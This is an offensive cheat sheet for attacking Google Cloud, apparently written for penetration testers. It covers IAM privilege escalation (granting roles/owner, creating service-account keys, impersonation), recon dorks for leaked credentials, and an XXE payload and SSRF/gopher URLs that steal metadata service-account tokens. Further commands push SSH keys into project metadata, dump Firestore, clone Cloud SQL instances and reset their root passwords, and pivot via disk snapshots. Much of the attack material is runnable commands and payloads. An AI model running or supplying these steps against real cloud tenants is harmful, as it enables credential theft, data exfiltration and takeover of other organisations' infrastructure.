# GCP Pentest : Tools and Techniques

## MITRE Att&ck : Cloud Matrix
- https://attack.mitre.org/matrices/enterprise/cloud/

## Google Cloud Vs Google Workspace
- Google Cloud Platform (GCP) : Provides cloud services (IAAS, PAAS, SAAS)
- Google Workspace (G-Suite) : Provides business application (SAAS, Idaas)

## GCP - 101
Google Cloud Platform resource hierarchy.
- https://cloud.google.com/resource-manager/docs/cloud-platform-resource-hierarchy

Azure and GCP follow Resource Based Policy comparing to AWS following Identity Based Policy.

Unlike AWS, in Azure (and GCP), the list of permissions is decoupled from the resources. The resources for which a permission assignment would apply is called a "scope." ([Source](https://ermetic.com/blog/cloud/aws-azure-and-gcp-the-ultimate-iam-comparison/))

<img src="../images/permissions_diff.png" alt="gcphierarchy" width="800"/>

```
Organization
--> Folders
  --> Projects
    --> Resources
```

### Organization
> The Organization resource is the root node in the Google Cloud resource hierarchy and is the hierarchical super node of projects.

### Folders
> Folders are nodes in the Cloud Platform Resource Hierarchy. A folder can contain projects, other folders, or a combination of both. Organizations can use folders to group projects under the organization node in a hierarchy.

### Project
> A GCP Project is basically a collection of various GCP services such as compute instances, storage buckets, Cloud run containers, etc. that are grouped together since they serve one application or project in the corporate terminology.

<img src="https://cloud.google.com/resource-manager/img/cloud-hierarchy.svg" alt="gcphierarchy" width="500"/>

### GCP Control Plane
GCP control plane can be defined as a set o APIs that allows a GCP administrator or an IAM user to start, monitor and stop various services that run within GCP environment.  

### GCP IAM
- Who / What / Where :
  1. Who: Members (User Account / Service Account)
  2. What: Role (Set of permissions)
  3. Where: Role binding to an object (At multiple possible levels)

--> Permissions are inherited which means if you have permission on project level you will have same permissions set on all resources within this project.  

<img src="./Images/role_binding.png" alt="rolebinding" width="800"/>

### GCP Role
**3** type of roles within GCP:
- **Basic Roles**: It's provides broader access to GCP resources (Owner, Editor, Viewer)
- **Prededfined Roles**: It's provides granular acces to specific GCP resources. (By product or service: Compute Admin, Computer Network Admin... etc)
- **Custom Roles**: It's provides custom access to GCP resources.

### GCP Service Account
Equivalent to role in AWS and Managed Identities in Azure.  
  
By default service account never expire and did not have MFA. Very interesting account for attackers.  
 
A service account is a special kind of account used by an application or GCP compute instance.  

Service account act as a identity as well as a resource:
- Service account as identity - Where we need GCP resource access without human intervention
- Service account as resource - Where we need access on other service accounts  
--> Service account is associated within a project and uniquely identity by it's email address

#### Default Service Account
- Automatically created within a project (Ex: User create a new compute instance)
  - App Engine: Default Service Account: PROJECT_ID@appspot.gserviceaccount.com
  - Compute Engine: Default Service Account: PROJECT_NUMBER-compute@developer.gserviceaccount.com

--> The Compute Engine default service account is created with the **IAM basic Editor role**. They have this permission on Project level.

#### User Managed Service Account
- Created and managed by end user when required
  - SERVICE_ACCOUNT_NAME@PROJECT_ID.iam.gserviceaccount.com

#### Google Managed Service Account
- Used by GCP Services when they need access to user resource on their behalf. Service account is owned by Google and is not listed in the Service Accounts section of Cloud Console. 

### Secrets to GCP Control Plane
### Owner (username/password)
This is the first account used to sign up for GCP.
--> Root level credential, owner credential for the GCP project

### GCP IAM user
GCP Identity and Access Management (IAM) allows to create unique IAM user identities. IAM accounts are restricted by default in terms of the privileges they are provided with.

### Service account
Special type of Google account intended to represent a non-human user that need to authenticate and be authorized to access data in Google APIs.  

--> **Service account key files**: JSON files containing the private key of the service account. Used by application to access various other GCP resources.

### OAuth 2.0 Client credentials
In some case we would not use service account but user credentials to access resources on behalf of an end user for example, in this case we will use OAuth 2.0 client credentials.  

--> A client token will be obtained after the user grants permissions and this allows an application to access project resources under that user's account. ([OAuth Token Hijacking](https://www.youtube.com/watch?v=motZouxkVZ0))

### API Keys
API keys are simple encrypted strings that can be used when calling certain APIs that don't need to access private user data.   

API Key are mostly used to track API requests associated with the project for quota and billing.

**Threat regarding GCP**  
- Owner account
- IAM credentials
- Service account key files

3 Types of IAM roles:
- Basic Roles: Existing roles prior to the introduction of IAM
	+ Owner
	+ Editor
	+ Viewer

- Predefined Roles: Granular access for specific service
	+ [Created by Google](https://cloud.google.com/iam/docs/understanding-roles#predefined_roles)

- Custom Roles : Ganular access to user-specified list of permissions.

**Checking permissions**
- [IAM permissions](https://cloud.google.com/iam/docs/permissions-reference)
- [Predefined roles](https://cloud.google.com/iam/docs/understanding-roles#predefined_roles)
- [Product specific IAM roles](https://cloud.google.com/iam/docs/understanding-roles#product_specific_documentation)

### GCP Access
### Web console
- https://console.cloud.google.com  
--> Management UI (classical admin console interface with GUI accessible through browser)

### Gcloud CLI
- https://cloud.google.com/sdk/docs/cheatsheet
--> Google Cloud CLI is a set of tools to create and manage Google Cloud resources.

Through click on the web console or gcloud CLI you will directly talk to Controle Plan APIs (Restfull).

### Obtaining User Access Tokens

As mentionned previously 2 types of accounts exist within GCP :
- User accounts (user credentials)
- Service accounts (service account credentials)

Secret in user credentials files takes the form of a long-lived **refresh tokens** .   
--> You usually obtain (authorized) user credential files by through the underlying command, which initiates an **[OAuth 2.0 authorization code grant](https://www.oauth.com/oauth2-servers/server-side-apps/authorization-code/#:~:text=The%20authorization%20code%20is%20a,exchange%20for%20an%20access%20token.&text=This%20also%20means%20the%20access,token%20leaking%20to%20someone%20else.)**.

```
gcloud auth application-default login
```

--> This will produce a credential file called : **application_default_credentials.json**  
--> Located at : **~/.config/gcloud**  

<img src="./Images/application_default_credentials.png" alt="gcphierarchy" width="700"/>

This **refresh token** can be used to obain access tokens using **[OAuth 2.0 refresh token grant](https://oauth.net/2/grant-types/refresh-token/)**  

As an attacker some actions or tools required an **access tokens** to operate. In fact the **refresh token grant** action only requires a single call to retrieve a valid **access token**.

```
curl --location --request POST "https://oauth2.googleapis.com/token" --header "Content-Type: application/json" --data-raw "{
       'client_id': 'XXXXXXXXXX-XXXXXXXXXXXX.apps.googleusercontent.com',
       'client_secret': 'X-XXXXXXXXXXXXXXXX',
       'refresh_token': 'XXXXXXXXXXXXXXXXXXXXXXXXXX',
       'grant_type': 'refresh_token'
     }"

```
--> The response is an access token and an ID token.

**Note 1** : You can modify the access token scopes by specifying scopes in your request, although you cannot increase beyond the scopes of the original refresh token.  

**Note 2** : The scope ending *cloud-platform* gives you access to pretty much all GCP resources.  


### Obtaining Service Account Access Tokens

GCP Service Accounts [documentation](https://cloud.google.com/compute/docs/access/service-accounts).  

Service account credential files are JSON files containing **private key**.    This private key is generated from GCP Console or using Gcloud cli.  

These key can be used to obtain **access tokens**. The private key is stored within service account credential files
```
{
  "type": "service_account",
  "project_id": "project-id",
  "private_key_id": "**redacted**",
  "private_key": "-----BEGIN PRIVATE KEY-----\n**redacted**\n-----END PRIVATE KEY-----\n",
  "client_email": "service-account-name@project-id.iam.gserviceaccount.com",
  "client_id": "**redacted**",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/service-account-name%40project-id.iam.gserviceaccount.com"
}
```

In order to obtain access tokens for service account, most of the time attacker will exploit the metadata service directly and retrieve the access tokens.

```
curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

You can also directly authentify yourself using the service account credential JSON file.  
```
gcloud auth activate-service-account --project=<YOUR GCLOUD PROJECT> --key-file=<SERVICE ACCOUNT FILE>
```








## GCP - Analysis
### Scoutsuite
- https://github.com/nccgroup/ScoutSuite
Multi-Cloud security auditing tool.

### Lyft
- https://github.com/lyft/cartography
Tool to enumerate and print in a graph resources and relations of different cloud platforms

### Hayat
- https://github.com/DenizParlak/hayat

Hayat is a auditing & hardening script for Google Cloud Platform services such as:

- Identity & Access Management
- Logging and monitoring
- Networking
- Virtual Machines
- Storage
- Cloud SQL Instances
- Kubernetes Clusters

### GCP-IAM-Collector
Python scripts for collecting and visualising Google Cloud Platform IAM permissions.  

GCP IAM graph is created using vis.js and it's static HTML page, see example interactive graph.  

- https://github.com/marcin-kolda/gcp-iam-collector

### GCP IAM Role Permission
- https://github.com/darkbitio/gcp-iam-role-permissions

### GCP IAM Analyzer
- https://github.com/jdyke/gcp-iam-analyzer

#### Exploiting Set IAM Policy Permission
Using XXXX.setIamPolicy with a user or service account can set IAM policy on different resources depending on the permission level (Organizations, Folder, Project, Resource).  

- **Organization Level**: resourcemanager.organizations.setIamPolicy
- **Folder Level**: resourcemanager.folders.setIamPolicy
- **Project Level**: resourcemanager.projects.setIamPolicy
- **Resource**: computer.instances.setIamPolicy

Getting project ID and listing IAM policy applied on the project level
```
gcloud config list
gcloud projects get-iam-policy <projectID> --flatten="bindings[].members" --filter="bindings.members=user:username@company.com" --format="value(bindings.role)"
```

List permissions in custom role
```
gcloud iam roles describe [rolename] --project <projectID>
```

Exploiting Set IAM Policy
```
gcloud projects add-iam-policy-binding [project-id] --member='user:[user-email]' --role='roles/owner'
```

#### Exploiting Custom Role permissions update
Custom role contains user defined permissions, custom role can **only be attached to organization OR project level**.  

Permission: **iam.roles.update**

```
gcloud iam roles update <CustomRoleName> --project=<ProjectName> --add-permissions=resourcemanager.projects.setIamPolicy
```

#### Exploiting Service Account Key Admin
**Key Admin** can create a new key for a Service Account. Service Account can have up to **10** keys.  

Permission: **iam.serviceAccountkeys.create**
Role: **roles/iam.serviceAccountKeyAdmin** OR **roles/iam.serviceAccountAdmin**

Create a new key for specific service account
```
gcloud iam service-accounts keys create <File.json> --iam-account <ServiceAccountID>
```

#### Exploiting Service Account impersonation
As the name suggest it lets principals impersonate service accounts, allowing principals to create short-lived credentials for service accounts, or use the **--impersonate-service-account** flag.  

Permissions: **roles/iam.serviceAccountTokenCreator**  
This role include:
- iam.serviceAccounts.getAccessToken: lets you create OAuth 2.0 access tokens
- iam.serviceAccounts.getOpenIdToken: lets you create OpenID Connect (OICD) ID tokens

Create short-lived credentials [access token] for service accounts by impersonation. (Access Tokens are only available for 60 minutes)
```
gcloud auth print-access-token --impersonate-service-account [ImpersonateServiceAccountEmail]
```

Verify short-lived credentials [access token]. Valid for 3600 seconds (1 hour)
```
curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=[AccessToken]
```

Create short-lived credentials [identity token] for service accounts by impersonation.
```
gcloud auth print-identity-token --impersonate-service-account [ImpersonateServiceAccountEmail]
```

Verify short-lived credentials [identity token].
```
curl https://www.googleapis.com/oauth2/v1/tokeninfo?identity_token=[IdentityToken]
```

#### Exploiting Service Account User
This permission allows principals to indirectly access all the resources that the service account can access.  

Role: **roles/iam.serviceAccountUser**
Permission: **iam.serviceAccounts.actAs**

Listing service account permission set
```
gcloud iam service-accounts get-iam-policy [ServiceAccountID]
```

### GCP Firewall enum
Parse gcloud output to enumerate compute instances with network ports exposed to the Internet.


- https://gitlab.com/gitlab-com/gl-security/security-operations/gl-redteam/gcp_firewall_enum

### GCP_enum
A simple bash script to enumerate Google Cloud Platform environments. The script utilizes gcloud, gsutil, and curl commands to collect information from various GCP APIs. The commands will use the current "Application Default Credentials".  

- https://gitlab.com/gitlab-com/gl-security/security-operations/gl-redteam/gcp_enum

### GCP K8s enum
This tool analyzes the output of several gcloud commands to determine services exposed to the public Internet via Google Kubernetes Engine (GKE) Ingress.  

- https://gitlab.com/gitlab-com/gl-security/security-operations/gl-redteam/gcp_k8s_enum













## GCP – Enumeration / Recon

### Open buckets / CloudRun / Functions
- https://gitlab.com/gitlab-com/gl-security/security-operations/gl-redteam/gcp_misc.git

This github repo contain bash scripts that may be usefull to find open buckets, open cloudrun and open functions from an external attacker perspective (unauthenticated).

- find_open_cloudrun.sh: Cloud Run services that permit unauthenticated invocations anywhere in your GCP organization.
- find_open_buckets.sh: Find buckets that are open to the public anywhere in your GCP organization.
- find_open_functions.sh: Find Cloud Functions that permit unauthenticated invocations anywhere in your GCP organization

```
bash find_open_cloudrun.sh
```

### GCP - Azure - AWS IP ranges
Python script performing the necessary actions for collecting the latest IP addresses used by Amazon Web Services, Google Compute, and Microsoft Azure.  

- https://github.com/chrismaddalena/UsefulScripts/blob/master/UpdateCloudIPs.py

### Shodan / Censys
Look for strings within Shodan related to GCP environments:
- storage.google.apis.com

### CloudScraper (modified version)
- https://github.com/lutzenfried/CloudScraper

-> (Modified version including additionnal GCP and Azure interesting endpoints)

- bc.googleusercontent.com (GCE instances)
- appspot.com (Google App Engine)
- run.app (Google Cloud run)
- firebaseio.com (Google Cloud Firestore - NoSQL)
- cloudfunctions.net (Google Cloud Functions)
- azurewebsites.net (Azure websites)
- cloudapp.net (Azure Cloud App)
- cloudapp.azure.com (Azure Cloud App)

CloudScraper is a Tool to spider and scrape targets in search of cloud resources. Plug in a URL and it will spider and search the source of spidered pages.

```
python3 CloudScraper.py -v -p 4 -d 5 -u https://www.company.com
```

### GCP Dorks
- Finding service account credentials
```
site:github.com "auth_provider_x509_cert_url"
```

- Identifying GCE instances that might have JSON file:
```
site:bc.googleusercontent.com ext:json intext:url
```
--> If a website is hosted in this GCE, add the IP before **bc**.
```
https://33.xx.xx.xx.bc.googleusercontent.com/
```
--> Automated technique:
SearchDiggity (Credits to : BishopFox)
- https://resources.bishopfox.com/resources/tools/google-hacking-diggity/attack-tools/

<img src="https://resources.bishopfox.com/wp-content/uploads/2013/07/SearchDiggity-ToolList-29May2014v2.png" alt="firebasedorks" width="500"/>


- Identifying GCP Storage.
	- https://bucket_name.storage.googleapis.com
	- https://storage.googleapis.com/bucket_name

```
site:storage.googleapis.com

```
--> Automated technique: [GCPBucketBrute](https://github.com/lutzenfried/OffensiveCloud/blob/main/GCP/GCP%20Pentest%20Cloud%20-%20Resources.md#gcp--gcpbucketbrute)

- Identifying App Engine
```
site:appspot.com inurl:admin ext:html
```

- Identifying Cloud run
```
site:run.app inurl:admin
```

- Identifying Cloud FireStore (NoSQL database)
```
site:firebaseio.com inurl:admin
```
<img src="./Images/dork_firebase.png" alt="firebasedorks" width="500"/>

- Identifying Cloud Functions
```
site:cloudfunctions.net inurl:admin
```
- Identifying potential SSRF
```
site:appspot.com ext:php inurl:url=
```

### Dorks automation techniques:  
1. SearchDiggity
- https://resources.bishopfox.com/resources/tools/google-hacking-diggity/attack-tools/  


2. Dork-cli
- https://github.com/jgor/dork-cli

In order to use this program you need to configure at a minimum two settings: a Google API key and a custom search engine id.

### GCP Storage - GreyHatWarfare
Finding GCP Storage resources such as buckets:
- https://buckets.grayhatwarfare.com/

### GCP Storage misc locations
- Github, other repo technology to find storage endpoint
- Mobile app of the company
- Wayback machine (enum_wayback module MSF)

### Accessing Onjects
- https://storage.googleapis.com/its_all_in_the_cloud/object001.jpg
	- storage.googleapis.com -> GCP
	- its_all_in_the_cloud -> Globally unique bucket name
	- object001.jpg -> Object Name

### Git / Repo secret parsers
Public Repository Search for Credentials/Access Keys/Configuration Files  
```
- [gitleaks] (https://github.com/zricethezav/gitleaks)
- [trufflehog] (https://github.com/trufflesecurity/truffleHog)
- [git-secrets] (https://github.com/awslabs/git-secrets)
- [shhgit] (https://github.com/eth0izzle/shhgit)
- [gitrob](https://github.com/michenriksen/gitrob)
- [Token Hunter](https://gitlab.com/gitlab-com/gl-security/security-operations/gl-redteam/token-hunter)
```

--> Within Github search for the following terms in company profile :
- storage.googleapis.com

--> Within Github search look for service account credentilas:
```
auth_provider_x509_cert_url extension:json
```
![github_service_account](Images/github_service_account.png)

### Cloud_Enum
Tool to search for public resources in AWS, Azure, and GCP

- https://github.com/initstring/cloud_enum

```
python3 cloud_enum.py -k <name-to-search>
```

### Cloud Brute
- https://github.com/0xsha/CloudBrute

Tool to find a company (target) infrastructure, files, and apps on the top cloud providers (Amazon, Google, Microsoft, DigitalOcean, Alibaba, Vultr, Linode).

```
CloudBrute -d company.com -k keyword -m storage -t 80 -T 10 -w -c google -o target_output.txt
```








## GCP - Authenticated enumeration
### Cloud Service Enum
This script allows pentesters to validate which cloud tokens (API keys, OAuth tokens and more) can access which cloud service.  

- https://github.com/NotSoSecure/cloud-service-enum/
- https://notsosecure.com/cloud-services-enumeration-aws-azure-and-gcp

### User - data access
In case of web application or instance compromise it is possible to access instance meta-data, but also to access **user data**.
--> These data are specified when we launch our instance, e.g. Simple script to specify parameters to configure a MySQL database on the instance.












## GCP - Exploitation

### Phishing G-Suite:
• Calendar Event Injection
• Silently injects events to target calendars
• No email required
• Google API allows to mark as accepted
• Bypasses the “don’t auto-add” setting
• Creates urgency w/ reminder notification
• Include link to phishing page

### OAuth Phishing (Illicit Grant Attack)
illicit grant attacks use the actual OAuth authentication/authorization flows in order to obtain the OAuth session tokens. This has the advantage of bypassing MFA authentication, with permanent or nearly indefinite access since the OAuth tokens can be continually refreshed in most cases using **refresh token**  

- https://www.youtube.com/watch?v=motZouxkVZ0

<img src="./Images/oauth_flow.png" alt="firebasedorks" width="800"/>

### Google Kubernetes Engine (GKE)
- https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/
- https://www.4armed.com/blog/hacking-kubelet-on-gke/

### Exploitation framework : GCploit
- https://github.com/dxa4481/gcploit

#### Exploiting "actAs" permission
- https://youtu.be/Ml09R38jpok?t=1306

> When you create certain Google Cloud resources, you have the option to attach a service account. The attached service account acts as the identity of any jobs running on the resource, allowing the jobs to authenticate to Google Cloud APIs.

> For most Google Cloud services, users need permission to impersonate a service account in order to attach that service account to a resource. This means that the user needs the **iam.serviceAccounts.actAs** permission on the service account.

--> Require service account identity (JSON)

List service account that you managed to compromised (without basis service account)
```
gcploit --list
```

List the project we have access to with the basis service account or the compromised service account
```
gcploit --gcloud "projects list"
```

Exploit using **iam.serviceAccounts.actAs** and target all service account within a project.  
This exploit requires the base identity have actAs and functionCreator on the target project.
```
gcploit --exploit actas --project <ProjectID> --target_sa all
```
#### Exploiting "dataProc" permission
> Dataproc permissions allow users, including service accounts, to perform specific actions on Dataproc clusters, jobs, operations, and workflow templates. For example, the **dataproc.clusters.create** permission allows a user to create Dataproc clusters in your project. 

**Note**: *Security requirement beginning August 3, 2020: Dataproc users are required to have service account ActAs permission to deploy Dataproc resources, for example, to create clusters and instantiate workflows.* 

Exploit using **dataproc.clusters.create** and attach default service account using dataprocserviceaccount.  
This is going to launch a new data proc cluster with a new default compute service account.
```
gcploit --exploit dataproc --project <ProjectID> --source <dataprocserviceaccount>
```
### Exploitation framework : Purple Panda


### Exploiting shared images

### GCP : GCPBucketBrute
Google Storage buckets, determine what access you have to them, and determine if they can be privilege escalated.  

- https://github.com/RhinoSecurityLabs/GCPBucketBrute

This tool can be used using unauthenticated/authenticated approach.

If credentials --> the majority of enumeration will still be performed while unauthenticated, but for any bucket that is discovered via unauthenticated enumeration, it will attempt to enumerate the bucket permissions using the TestIamPermissions API with the supplied credentials.

```
python3 gcpbucketbrute.py -k companyName -u

```

### Checking permission
**2 ways** to check the permissions over a GCP bucket.
1. Request to https://www.googleapis.com/storage/v1/b/BUCKET_NAME/iam
2. gsutil iam get gs://BUCKET_NAME

--> Permissions to read the iam policy of the bucket are required (**storage.buckets.getIamPolicy**)

### Brute force file within bucket
If the bucket is configured correctly and file listing is not possible, that does not mean the files are protected correctly within the bucket. It is possible that the owner of the bucket forgot to set the permissions on sensitive files uploaded to that bucket.

- Use [enumFilesStorage.py](https://github.com/lutzenfried/OffensiveCloud/blob/main/GCP/Scripts/enumFilesStorage.py)

```
# Usage : python3 enumeFilesStorage.py bucketName threadNumber
# python3 enumFilesStorage.py cdn_test 16

Not Found : index.php
Not Found : search.php
Not Found : login.php
============> Valid file found : a.log
Not Found : cron.php
Not Found : LICENSE.txt
Not Found : INSTALL.pgsql.txt
Not Found : register.php
Not Found : memberlist.php
Not Found : UPGRADE.txt
```

### Subdomain takeover
Subdomain takeover can occur within GCP environment. For example through bucket and DNS entry misconfiguration.  

In case a DNS entry still points to the subdomain to that GCP bucket, but the bucket has been deleted, an attacker woul be able to **create** a new bucket with the same name under hist attacker's GCP account.

This would provide capability to attacker to create malicious JavaScript, or served any content using victim organization identity.  

```
e.g. foo.example.com ---DNS--entry--(CNAME)---> foo.storage.googleapis.com
```
### Subdomain takeover technic
1. Enumerating subdomain and maps where subdomain point to.
- https://github.com/nahamsec/HostileSubBruteforcer
- https://github.com/aboul3la/Sublist3r
- Certificate transparency https://crt.sh/?q=company.com
- httpstatus.io to verify status code

2. In case it points to deleted GCP bucket : **No Such Bucket**
--> Reserve a bucket within your GCP environment with the same name.

<img src="./Images/nosuchbucket.png" alt="cookies" width="500"/>

### GCP : XML External Entity (XXE)
Retrieve instance metadata service account token using XXE vulnerability

```
<!DOCTYPE foo [<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json">]>

```

### GCP : Server Side Request Forgery (SSRF)
v1 and v1beta1 depecation : https://cloud.google.com/compute/docs/deprecations/v0.1-v1beta1-metadata-server

--> v1beta1 deprecated but sometimes works.

- metadata.google.internal : 169.254.169.254
```
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
```

- Beta does NOT require a header atm (but normally deprecated)
```
http://metadata.google.internal/computeMetadata/v1beta1/
http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
```

- Use gopher SSRF to add the required headers
- Metadata-Flavor: Google
```
gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a
```

### Accessing interesting files
- **SSH Public Key** : http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json
- **Get Access Token** : http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
- **Kubernetes Key** : http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=jso

### SSRF Exploitation scenario:
1. Extract the token
```
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json
```

2. Check the scope of the token
```
$ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA  

{
        "issued_to": "101302079XXXXX",
        "audience": "10130207XXXXX",
        "scope": "https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring",
        "expires_in": 2443,
        "access_type": "offline"
}
```

3. Now push the SSH key
```
curl -X POST "https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata"
-H "Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA"
-H "Content-Type: application/json"
--data '{"items": [{"key": "sshkeyname", "value": "sshkeyvalue"}]}'
```

### Validate a User Tokens
Query the Google API to validate and  determine token scope.
```
curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ywgfhdb3dyx-xj0_EofjsfFks53kdDF
```
- [gcp_check_token.py](https://github.com/Stage2Sec/CaptureTheCloud/blob/master/gcp_check_token.py)
- [gcp_get_token_gce_header.py](https://github.com/Stage2Sec/CaptureTheCloud/blob/master/gcp_get_token_gce_header.py)
- [gcp_get_token_gce_v1beta1.py](https://github.com/Stage2Sec/CaptureTheCloud/blob/master/gcp_get_token_gce_v1beta1.py)
Check access token is valid and it's scope via googleapis.com

### Exploiting Kubernetes (K8s-GKE)
- https://gitlab.com/gitlab-com/gl-security/security-operations/gl-redteam/red-team-tech-notes/-/tree/master/K8s-GKE-attack-notes
- https://github.com/lightspin-tech/red-kube
- https://www.4armed.com/blog/hacking-kubelet-on-gke/
- https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/

**Scenario** : You exploit a webapp and get command execution.  

### Validate you are in container env
Check for environment variables for *kupepods* process
```
/bin/cat /proc/1/cgroup
```

If Docker in use, check for *.dockerenv* at /
```
ls -lah /
```

Check process list on the box (pid 1 is not **init** or **launchd**)
```
ps -aux

```

### Accessing secrets
By default, a container in the Kubernetes cluster will hold a service account token within its file system. If attackers find that token, they can use it to move laterally, or depending on the privilege of the service account, they can escalate its privilege to compromise the entire cluster environment.  
```
/run/secrets/kubernetes.io/serviceaccount/token
/var/run/secrets/kubernetes.io/serviceaccount/token
```

Access token via metadata from compromised nodes.
```
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
```
















## GCP - Lateral movement / pivoting

### Identify compute permissions
Assuming we have an RCE on a given instance.

Retrieve access token for the service account associated with the instance
```
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/<NUMBER>-compute@developer.gserviceaccount.com/token" -H "Metadata-Flavor: Google"
```

Get the name of attached scope to this service accont
```
curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=<ACCESS_TOKEN>
```

## Plundering User-Data scripts
Access instance metadatas
```
curl "http://metadata.google.internal/computeMetadata/v1/" -H "Metadata-Flavor: Google"
```

If instance stores user-data then it is possibel to navigate to the URL below on the compromised instance
```
curl "http://metadata.google.internal/computeMetadata/v1/instance/attributes" -H "Metadata-Flavor: Google"
```

Get the values of each of the attribute (based on the attribute within the response of the previous request)
```
curl "http://metadata.google.internal/computeMetadata/v1/instance/attributes/username" "-H "Metadata-Flavor: Google"
```

## Plundering FireStore (NoSQL DB)
Install python API
```
pip3 install --upgrade google-cloud-firestore
```

Use service account capable of accessing the firestore collections
```
export GOOGLE_APPLICATION_CREDENTIALS=NAME_OF_FILE.json
```

Enumerates all the collections in Firestore instance for that project and dump the documents
```
#/usr/env/bin python3

db = firestore.Client()
coll = db.collections()

for x in coll:
  users_ref = x

  for doc in users_ref.stream():
    print(u'{}'.format(doc.id, doc.to_dict()))
```

## Plundering StackDriver logs
[StackDrvier](https://cloud.google.com/sdk/gcloud/reference/logging/) logs are Google's infrastructure logs. A lot of data can be obtained from here :
- Syslog-like
- HTTP requests
- Network packet metadata

--> The service account for a Compute Instance only needs WRITE access to enable logging on instance actions, but an administrator may mistakenly grant the service account both READ and WRITE access. If this is the case, you can explore logs for sensitive data.  

List type of logs available
```
gcloud logging logs list
```

Read specific logs
```
gcloud logging read <FOLDER_NAME>
```

### GCP Cloud Run / GCP CloudFunction
CloudRun is a managed compute platform, it is serverless and abstracts away all infrastructure management. (e.g. AWS Fargate, Azure container instances)  
CloudFunction is a serveless execution environment for building and connecting cloud services. (e.g. AWS Lambda, Azure Function)  

CloudRun and CloudFunction have 2 waysg of getting compromised:  
1. Code injection (unzanitized input)
RCE, Deserialization...  

2. Code delivery (Tampering code deployments)
Code is corrupted by an attacker by compromising the deployment process, and then via development pipeline the corrupt code can be propagated into the environment.  




### Add SSH Keys
Check ssh keys attached to instance
```
gcloud compute instances describe instance-1 --zone=us-central1-a --format=json | jq '.metadata.items[].value'
```

Check for "privilegeduser:ssh-rsa" and generate ssh keys with same username and paste in file
```
ssh-keygen -t rsa -C "privilegeduser" -f ./underprivuser
```

Upload the file with the 2 keys and access to the instance.
```
gcloud compute instances add-metadata instance-1 --metadata-from-file ssh-keys=keys.txt --zone us-central1-a
ssh -i underprivuser privilegeduser@xx.xx.xx.xx
```

### SharpCloud
SharpCloud is a simple C# utility for checking for the existence of credential files related to Amazon Web Services, Microsoft Azure, and Google Compute.

#### Searches all user profiles for credentials related to Google Compute.
```
SharpCloud.exe gcloud
```

- https://github.com/chrismaddalena/SharpCloud

### Pivot using disk snapshots
In case our permission allow this action, we can list the disk snapshots and try to mount a snapshot and start a new compute instance using that snapshot.

Listing snapshot
```
gcloud compute snapshots list
```

Creating a disk based on snapshot
```
gcloud compute --project "test-project" disks create "new-instance-attacker" -size "10" --zone "us-centrale1-a" --source-snapshot "snapshot-1" --type "pd-standard"
```

--> Access the newly created instance:
- via web console (SSH/RDP)
- gcloud compute ssh instance-3

### Pivot using Clone (SQL)
In case compromised GCP user's credentials have access to SQL instances within the organization GCP account.

List cloud SQL instances
```
gcloud sql instances list
```

If access to SQL instance --> clone that instance and create a new instance
```
gcloud sql instances clone targetsql targetsql-clone
Cloning Cloud SQL instance...done*.
```

Using "set-password" API to change SQL database root user's password
```
gcloud sql users set-password root -i target-clone --host=102.XX.XX.XX --password=Password123
```

### Accessing secrets within App Engine
Validate user account has access to App Engine
```
gcloud app versions list
```

Describe App engine, display all data about an existing service 
```
gcloud app describe <App>
```

### From compromised node
If access to a container, a compromised pode can talk to the kubelet on ports:
- TCP 10250
- TCP 10255

--> Checking if port are accessible: E.g for port 10250  
```
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
result = sock.connect_ex(('192.168.0.10',10250))
if result == 0:
	print ("Port is open")
else:
	print ("Port is not open")
sock.close()
```

--> Listing pods
```
import urllib

response = urllib.urlopen('http://10.128.0.10:10255/pods')
print("Response : ", response)
print("URL : ", response.geturl())

headers = response.info()
print (headers)

data = response.read()
print (data^)
```

### Container Breakout
If you land on a container that is not configured with default settings, you may need to escalate your privileges or escape from it in order to gain access to the underlying host OS.

- Docker Breakout (HackTricks)
- Container Escape Using Kernel Exploitation (CyberArk)
- How I Hacked Play-with-Docker (CyberArk)
- CVE-2016-5195
- CVE-2019–5736
- CVE-2019–14271
- CVE-2020–15257

### Services Accounts - Lateral movement
In case of service account compromise you can try to impersonate another service account to launch command within the context of another service account and attempt to move laterally or obtain further informations.

The three predefined roles to allow a user to impersonate a service account are:  

- **Service Account User** (roles/iam.serviceAccountUser): Allows members to indirectly access all the resources that the service account can access. For example, if a member has the Service Account User role on a service account, and the service account has the Cloud SQL Admin role (roles/cloudsql.admin) on the project, then the member can impersonate the service account to create a Cloud SQL instance.
